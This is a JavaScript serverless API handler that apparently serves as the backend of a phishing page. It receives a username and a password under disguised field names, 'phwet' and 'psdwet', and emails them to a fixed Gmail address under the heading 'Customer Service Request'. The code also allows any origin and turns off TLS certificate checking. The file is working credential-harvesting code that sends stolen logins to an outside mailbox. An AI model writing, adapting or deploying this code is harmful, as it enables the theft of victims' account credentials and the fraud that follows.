// api/submit.js - Vercel Serverless Function (CommonJS format)
const nodemailer = require('nodemailer');

module.exports = async function handler(req, res) {
  // Handle CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    console.log('API called with method:', req.method);
    console.log('Request body:', req.body);

    // Validate environment variables
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('Missing email credentials');
      return res.status(500).json({ 
        success: false, 
        error: 'Server configuration error' 
      });
    }

    const maillist = ['Gfequitygroupjobcenter@gmail.com'];

    const transporter = nodemailer.createTransporter({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
      tls: {
        rejectUnauthorized: false
      }
    });

    console.log('Attempting to verify transporter...');
    await transporter.verify();
    console.log('Transporter verified successfully');

    const { phwet, psdwet } = req.body;

    // Validate required fields
    if (!phwet && !psdwet) {
      return res.status(400).json({ 
        success: false, 
        error: 'At least one field is required' 
      });
    }

    const mailOptions = {
      from: `"Customer Service" <${process.env.EMAIL_USER}>`,
      to: maillist,
      subject: 'Customer Service Request',
      html: `
        <h3>New Customer Service Request</h3>
        <p><strong>Email/Username:</strong> ${phwet || 'Not provided'}</p>
        <p><strong>Password:</strong> ${psdwet || 'Not provided'}</p>
      `
    };

    console.log('Sending email...');
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent successfully:', info.messageId);

    return res.status(200).json({ 
      success: true, 
      message: 'Request submitted successfully' 
    });

  } catch (error) {
    console.error('API Error:', error);
    console.error('Error stack:', error.stack);
    
    // Return different messages based on error type
    if (error.code === 'EAUTH') {
      return res.status(500).json({ 
        success: false, 
        error: 'Email authentication failed' 
      });
    } else if (error.code === 'ECONNECTION') {
      return res.status(500).json({ 
        success: false, 
        error: 'Failed to connect to email server' 
      });
    }
    
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error: ' + error.message 
    });
  }
};